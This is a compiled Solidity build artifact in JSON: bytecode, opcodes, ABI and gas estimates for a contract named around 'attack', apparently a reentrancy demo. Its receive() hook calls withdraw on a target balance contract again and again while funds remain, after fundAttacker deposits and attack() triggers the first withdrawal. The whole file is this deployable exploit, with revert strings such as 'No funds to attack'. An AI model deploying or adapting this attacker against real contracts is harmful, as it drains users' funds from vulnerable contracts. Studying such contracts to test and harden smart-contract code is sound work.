{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561000f575f80fd5b5060405161081f38038061081f833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6107138061010c5f395ff3fe60806040526004361061004d575f3560e01c8063322a5e5f14610132578063407c28211461015c578063699151e6146101865780639e5faafc146101a2578063a8e30e2c146101b85761012e565b3661012e5760015f81548092919061006490610463565b9190505550345f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061012c575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016100fe91906104b9565b5f604051808303815f87803b158015610115575f80fd5b505af1158015610127573d5f803e3d5ffd5b505050505b005b5f80fd5b34801561013d575f80fd5b506101466101e2565b604051610153919061054c565b60405180910390f35b348015610167575f80fd5b50610170610205565b60405161017d91906104b9565b60405180910390f35b6101a0600480360381019061019b9190610593565b61020b565b005b3480156101ad575f80fd5b506101b66102cc565b005b3480156101c3575f80fd5b506101cc610426565b6040516101d991906104b9565b60405180910390f35b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b80341461024d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161024490610618565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004015f604051808303818588803b1580156102b2575f80fd5b505af11580156102c4573d5f803e3d5ffd5b505050505050565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b8152600401602060405180830381865afa158015610336573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061035a919061064a565b90505f811161039e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610395906106bf565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b81526004016103f691906104b9565b5f604051808303815f87803b15801561040d575f80fd5b505af115801561041f573d5f803e3d5ffd5b5050505050565b5f47905090565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f61046d8261045a565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361049f5761049e61042d565b5b600182019050919050565b6104b38161045a565b82525050565b5f6020820190506104cc5f8301846104aa565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61051461050f61050a846104d2565b6104f1565b6104d2565b9050919050565b5f610525826104fa565b9050919050565b5f6105368261051b565b9050919050565b6105468161052c565b82525050565b5f60208201905061055f5f83018461053d565b92915050565b5f80fd5b6105728161045a565b811461057c575f80fd5b50565b5f8135905061058d81610569565b92915050565b5f602082840312156105a8576105a7610565565b5b5f6105b58482850161057f565b91505092915050565b5f82825260208201905092915050565b7f53656e6420657861637420616d6f756e740000000000000000000000000000005f82015250565b5f6106026011836105be565b915061060d826105ce565b602082019050919050565b5f6020820190508181035f83015261062f816105f6565b9050919050565b5f8151905061064481610569565b92915050565b5f6020828403121561065f5761065e610565565b5b5f61066c84828501610636565b91505092915050565b7f4e6f2066756e647320746f2061747461636b00000000000000000000000000005f82015250565b5f6106a96012836105be565b91506106b482610675565b602082019050919050565b5f6020820190508181035f8301526106d68161069d565b905091905056fea2646970667358221220d273e1f5faf6a4f441bb933fedb4bd470f7e1e6d1f9ece1a04fa2a34c71a881764736f6c63430008140033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x81F CODESIZE SUB DUP1 PUSH2 0x81F DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x713 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x322A5E5F EQ PUSH2 0x132 JUMPI DUP1 PUSH4 0x407C2821 EQ PUSH2 0x15C JUMPI DUP1 PUSH4 0x699151E6 EQ PUSH2 0x186 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1A2 JUMPI DUP1 PUSH4 0xA8E30E2C EQ PUSH2 0x1B8 JUMPI PUSH2 0x12E JUMP JUMPDEST CALLDATASIZE PUSH2 0x12E JUMPI PUSH1 0x1 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x64 SWAP1 PUSH2 0x463 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP CALLVALUE PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x12C JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFE SWAP2 SWAP1 PUSH2 0x4B9 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x115 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x127 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x146 PUSH2 0x1E2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x153 SWAP2 SWAP1 PUSH2 0x54C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x167 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x170 PUSH2 0x205 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17D SWAP2 SWAP1 PUSH2 0x4B9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1A0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x19B SWAP2 SWAP1 PUSH2 0x593 JUMP JUMPDEST PUSH2 0x20B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B6 PUSH2 0x2CC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1C3 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1CC PUSH2 0x426 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D9 SWAP2 SWAP1 PUSH2 0x4B9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST DUP1 CALLVALUE EQ PUSH2 0x24D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x244 SWAP1 PUSH2 0x618 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2B2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2C4 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12065FE0 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x336 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x35A SWAP2 SWAP1 PUSH2 0x64A JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 GT PUSH2 0x39E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x395 SWAP1 PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3F6 SWAP2 SWAP1 PUSH2 0x4B9 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x40D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x41F JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x46D DUP3 PUSH2 0x45A JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x49F JUMPI PUSH2 0x49E PUSH2 0x42D JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4B3 DUP2 PUSH2 0x45A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4CC PUSH0 DUP4 ADD DUP5 PUSH2 0x4AA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x514 PUSH2 0x50F PUSH2 0x50A DUP5 PUSH2 0x4D2 JUMP JUMPDEST PUSH2 0x4F1 JUMP JUMPDEST PUSH2 0x4D2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x525 DUP3 PUSH2 0x4FA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x536 DUP3 PUSH2 0x51B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x546 DUP2 PUSH2 0x52C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x55F PUSH0 DUP4 ADD DUP5 PUSH2 0x53D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x572 DUP2 PUSH2 0x45A JUMP JUMPDEST DUP2 EQ PUSH2 0x57C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x58D DUP2 PUSH2 0x569 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x5A8 JUMPI PUSH2 0x5A7 PUSH2 0x565 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x5B5 DUP5 DUP3 DUP6 ADD PUSH2 0x57F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x53656E6420657861637420616D6F756E74000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x602 PUSH1 0x11 DUP4 PUSH2 0x5BE JUMP JUMPDEST SWAP2 POP PUSH2 0x60D DUP3 PUSH2 0x5CE JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x62F DUP2 PUSH2 0x5F6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x644 DUP2 PUSH2 0x569 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x65F JUMPI PUSH2 0x65E PUSH2 0x565 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x66C DUP5 DUP3 DUP6 ADD PUSH2 0x636 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F2066756E647320746F2061747461636B0000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x6A9 PUSH1 0x12 DUP4 PUSH2 0x5BE JUMP JUMPDEST SWAP2 POP PUSH2 0x6B4 DUP3 PUSH2 0x675 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x6D6 DUP2 PUSH2 0x69D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD2 PUSH20 0xE1F5FAF6A4F441BB933FEDB4BD470F7E1E6D1F9E 0xCE BYTE DIV STATICCALL 0x2A CALLVALUE 0xC7 BYTE DUP9 OR PUSH5 0x736F6C6343 STOP ADDMOD EQ STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "362200",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"attack()": "infinite",
				"attackCount()": "2425",
				"balanceContract()": "infinite",
				"fundAttacker(uint256)": "infinite",
				"getAttackerBalance()": "400"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"attackCount()": "407c2821",
			"balanceContract()": "322a5e5f",
			"fundAttacker(uint256)": "699151e6",
			"getAttackerBalance()": "a8e30e2c"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_balanceAddress",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "attackCount",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "balanceContract",
			"outputs": [
				{
					"internalType": "contract IBalance",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "amount",
					"type": "uint256"
				}
			],
			"name": "fundAttacker",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "getAttackerBalance",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}